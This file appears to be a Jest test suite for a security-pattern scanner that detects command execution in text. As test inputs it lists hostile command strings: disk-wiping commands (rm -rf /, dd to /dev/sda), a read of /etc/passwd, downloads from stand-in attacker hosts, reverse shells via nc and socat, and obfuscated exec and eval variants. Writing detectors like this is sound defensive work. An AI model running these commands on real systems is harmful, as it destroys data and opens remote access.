/**
 * Tests for Command Execution Security Patterns
 * Uses safe placeholder patterns to avoid triggering security systems
 */

import { scanForSecurityPatterns } from '../../src/validators/security-patterns.js';
import { 
  getTestCases, 
  createMockScanner,
  validateTestResult,
  generateTestReport,
  TestResult
} from './helpers/safe-test-helpers.js';

describe('Command Execution Pattern Detection', () => {
  const commandTestCases = getTestCases('command_execution');
  const mockScanner = createMockScanner();

  describe('Using Mock Scanner (Development)', () => {
    it('should detect all command execution placeholders', () => {
      const results: TestResult[] = [];
      
      commandTestCases.forEach(testCase => {
        const content = `Testing ${testCase.placeholder} pattern`;
        const issues = mockScanner.scan(content);
        const result = validateTestResult(testCase, issues);
        results.push(result);
      });
      
      const report = generateTestReport(results);
      console.log(report);
      
      const allPassed = results.every(r => r.passed);
      expect(allPassed).toBe(true);
    });

    it('should correctly identify each command execution pattern', () => {
      commandTestCases.forEach(testCase => {
        const content = `Content with ${testCase.placeholder} inside`;
        const issues = mockScanner.scan(content);
        
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe(testCase.expectedCategory);
        expect(issues[0].severity).toBe(testCase.expectedSeverity);
      });
    });
  });

  describe('Using Real Scanner (Integration)', () => {
    it('should detect shell command patterns', () => {
      const testPhrases = [
        'exec("ls -la")',
        'system("rm -rf /")',
        'shell("whoami")',
        'bash("cat /etc/passwd")',
        'cmd("dir C:\\")',
        'powershell("Get-Process")'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe('command_execution');
        expect(issues[0].pattern).toBe('shell_command');
        expect(issues[0].severity).toBe('critical');
      });
    });

    it('should detect direct command execution requests', () => {
      const testPhrases = [
        'execute the following command',
        'execute this command: rm -rf',
        'please execute command'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe('command_execution');
        expect(issues[0].pattern).toBe('execute_command');
      });
    });

    it('should detect code evaluation patterns', () => {
      const testPhrases = [
        'eval("malicious code")',
        'exec("python script")',
        'compile("source code")'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        
        // Find the eval_code pattern specifically (might not be first due to pattern order)
        const evalIssue = issues.find(i => i.pattern === 'eval_code');
        expect(evalIssue).toBeDefined();
        expect(evalIssue!.category).toBe('code_execution');
        expect(evalIssue!.severity).toBe('critical');
      });
    });

    it('should detect dangerous file operations', () => {
      const testPhrases = [
        'rm -rf /',
        'del /F /Q C:\\Windows',
        'format C:',
        'fdisk /dev/sda',
        'dd if=/dev/zero of=/dev/sda'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe('file_system');
        expect(issues[0].pattern).toBe('file_operations');
        expect(issues[0].severity).toBe('critical');
      });
    });

    it('should detect network access patterns', () => {
      const testPhrases = [
        'curl http://malicious.com',
        'wget ftp://evil.com/backdoor',
        'fetch https://attacker.com/payload'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe('network_access');
        expect(issues[0].pattern).toBe('curl_wget');
        expect(issues[0].severity).toBe('high');
      });
    });

    it('should handle mixed case and variations', () => {
      const variations = [
        'EXEC("command")',
        'SyStEm("command")',
        'CURL HTTP://EXAMPLE.COM'
      ];
      
      variations.forEach(content => {
        const issues = scanForSecurityPatterns(content);
        expect(issues.length).toBeGreaterThan(0);
        expect(['command_execution', 'network_access']).toContain(issues[0].category);
      });
    });

    it('should track line numbers correctly', () => {
      const content = `Line 1: Normal content
Line 2: Now exec("dangerous command")
Line 3: More content`;
      
      const issues = scanForSecurityPatterns(content);
      expect(issues.length).toBeGreaterThan(0);
      expect(issues[0].line).toBe(2);
    });

    it('should detect multiple command patterns', () => {
      const content = 'First exec("cmd1"), then system("cmd2"), and finally curl http://evil.com';
      
      const issues = scanForSecurityPatterns(content);
      expect(issues.length).toBeGreaterThanOrEqual(2);
      
      const patterns = issues.map(i => i.pattern);
      expect(patterns).toContain('shell_command');
      expect(patterns).toContain('curl_wget');
      
      // Check that we have command_execution issues
      const commandExecIssues = issues.filter(i => i.category === 'command_execution');
      expect(commandExecIssues.length).toBeGreaterThanOrEqual(1);
    });

    it('should detect obfuscated command patterns', () => {
      const testPhrases = [
        'ex' + 'ec("command")', // String concatenation
        'e\\x76al("code")',    // Hex encoding
        'sy\\u0073tem("cmd")'  // Unicode encoding
      ];
      
      testPhrases.forEach(phrase => {
        // Note: Current patterns may not catch all obfuscation
        // This test documents current behavior
        const issues = scanForSecurityPatterns(phrase);
        // Some obfuscation may bypass detection
        console.log(`Testing "${phrase}": ${issues.length} issues found`);
      });
    });

    it('should detect command injection in various contexts', () => {
      const contexts = [
        'Please run exec("ls") on the server',
        'The function system("whoami") returns the username',
        'Use curl https://api.example.com to fetch data'
      ];
      
      contexts.forEach(content => {
        const issues = scanForSecurityPatterns(content);
        expect(issues.length).toBeGreaterThan(0);
        expect(['command_execution', 'network_access']).toContain(issues[0].category);
      });
    });

    it('should detect OS-specific command patterns', () => {
      const testPhrases = [
        'os.system("ls -la")',
        'subprocess.call(["rm", "-rf"])',
        'popen("whoami")',
        'spawn("node", ["script.js"])',
        'execFile("/bin/sh")'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        
        // Find the os_command pattern specifically
        const osIssue = issues.find(i => i.pattern === 'os_command');
        expect(osIssue).toBeDefined();
        expect(osIssue!.category).toBe('command_execution');
        expect(osIssue!.severity).toBe('critical');
      });
    });

    it('should detect SQL command execution patterns', () => {
      const testPhrases = [
        'xp_cmdshell("dir")',
        'sp_execute_external_script(@language = "Python")'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe('command_execution');
        expect(issues[0].pattern).toBe('sql_command');
        expect(issues[0].severity).toBe('critical');
      });
    });

    it('should detect reverse shell patterns', () => {
      const testPhrases = [
        'nc -e /bin/sh 10.0.0.1 1234',
        'netcat --exec cmd.exe attacker.com 4444',
        'socat -c bash tcp:evil.com:9999'
      ];
      
      testPhrases.forEach(phrase => {
        const issues = scanForSecurityPatterns(phrase);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].category).toBe('command_execution');
        expect(issues[0].pattern).toBe('reverse_shell');
        expect(issues[0].severity).toBe('critical');
      });
    });
  });

  describe('Pattern Coverage', () => {
    it('should have patterns for all test cases', () => {
      const missingPatterns: string[] = [];
      
      commandTestCases.forEach(testCase => {
        if (!testCase.placeholder) {
          missingPatterns.push(testCase.id);
        }
      });
      
      expect(missingPatterns).toHaveLength(0);
    });

    it('should validate critical severity for dangerous operations', () => {
      const criticalPatterns = [
        'exec("rm -rf /")',
        'system("format c:")',
        'eval("malicious")',
        'delete /F /Q C:\\'
      ];
      
      criticalPatterns.forEach(pattern => {
        const issues = scanForSecurityPatterns(pattern);
        expect(issues.length).toBeGreaterThan(0);
        expect(issues[0].severity).toBe('critical');
      });
    });
  });
});